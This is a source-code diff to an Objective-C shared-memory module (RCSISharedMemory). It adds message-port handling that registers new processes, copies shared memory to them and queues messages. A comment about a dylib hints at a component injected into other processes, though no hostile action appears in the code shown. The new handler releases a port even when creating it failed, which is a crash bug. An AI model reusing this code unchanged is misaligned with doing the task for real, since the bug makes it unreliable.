@@ -16,7 +16,7 @@
 #import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
-//#define DEBUG
+#define DEBUG_
 //#define DEBUG_ERRORS
 //#define DEBUG_ERRORS_VERBOSE_1
 
@@ -34,6 +34,81 @@ typedef struct _shMemNewProc
   int magic;
   int pid;
 } shMemNewProc;
+
+// Callback for incoming message...
+CFDataRef coreMessagesHandler(CFMessagePortRef local,
+                              SInt32 msgid,
+                              CFDataRef data,
+                              void *info)
+{
+  CFStringRef       cfNewPort;
+  CFMessagePortRef  new_port = NULL;
+  BOOL              bRet = false;
+  
+  // paranoid...
+  if (data == NULL || info == NULL) 
+    return NULL;
+  
+  CFRetain(data);
+
+#ifdef DEBUG
+  NSLog(@"%s: msgid %#x recv data len %d", __FUNCTION__, msgid, [data length]);
+#endif
+  
+  RCSISharedMemory  *shMem      = (RCSISharedMemory *)info;
+  shMemNewProc      *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);
+
+  if (msgid == NEWPROCMAGIC && 
+      procBytes->magic == NEWPROCPORT) 
+    { 
+      cfNewPort = CFStringCreateWithFormat(kCFAllocatorDefault, 
+                                           0, 
+                                           CFSTR("%@_%d"), 
+                                           [shMem mFilename], 
+                                           procBytes->pid);
+      
+      new_port  = CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
+      
+      if (new_port == NULL) 
+        {
+#ifdef DEBUG
+        NSLog(@"%s: cannot create remote port %@", __FUNCTION__, cfNewPort);
+#endif
+        }
+      else 
+        {
+        // locked on new command processing by another thread...
+        @synchronized(shMem)
+          {
+            // add to array of machport
+            [shMem addPort: new_port];
+            
+            // duplicate shared memory to new proc...
+            [shMem synchronizeShMemToPort: new_port];
+          }
+        }
+      
+      CFRelease(cfNewPort);
+      CFRelease(new_port);
+      
+      bRet = true;
+    }
+  else 
+    { 
+      NSData *tmpData = [[NSData alloc] initWithBytes: CFDataGetBytePtr(data) 
+                                               length: CFDataGetLength(data)];      
+      @synchronized(shMem)
+      {
+        [shMem.mCoreMessageQueue addObject: tmpData];  
+      }
+      
+      [tmpData release];
+    }
+  
+  CFRelease(data);
+  
+  return NULL;
+}
 
 // Callback for incoming message...
 CFDataRef shMemCallBack (CFMessagePortRef local,
@@ -119,6 +194,8 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 @synthesize mFilename;
 @synthesize mSharedMemory;
 @synthesize mSize;
+@synthesize mCoreMessageQueue;
+@synthesize mLogMessageQueue;
 
 // Called by dylib only
 - (BOOL)isShMemValid
@@ -206,6 +283,7 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
       mSize         = aSize;
       mFilename     = aFilename;
       mRemotePorts  = [[NSMutableArray alloc] initWithCapacity: 0];
+      mCoreMessageQueue = [[NSMutableArray alloc] initWithCapacity: 0];
       mSharedMemory = NULL;
       mMemPort      = NULL;
       mRLSource     = NULL;
@@ -944,6 +1022,54 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 #endif
   
   return bRet;
+}
+
+////////////////////////////////////////////////////////////////
+
+// Core MUST use this to allocate sharedMem objects...
+- (int)createCoreRLSource
+{
+  Boolean bfool = false;
+  CFMessagePortContext shCtx;
+  
+  memset(&shCtx, 0, sizeof(shCtx));
+  
+  shCtx.info = (void *)self;
+  
+  mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault, 
+                                      (CFStringRef)mFilename, 
+                                      coreMessagesHandler, 
+                                      &shCtx, 
+                                      &bfool);
+  
+  if (mMemPort == NULL) 
+    {
+#ifdef DEBUG
+      NSLog(@"%s: cannot create %@ local port", __FUNCTION__, mFilename);
+#endif
+      return 1;
+    }
+  
+  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
+  
+  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
+  
+  return 0;
+}
+
+- (NSMutableArray*)fetchMessages
+{
+  NSMutableArray *tmpQueue;
+  
+  tmpQueue = [[[NSMutableArray alloc] initWithCapacity:0] autorelease];
+  
+  @synchronized(self)
+  {
+    tmpQueue = [[mCoreMessageQueue copy] autorelease];
+    [mCoreMessageQueue removeAllObjects];
+  }
+  
+  return tmpQueue;
 }
 
 @end
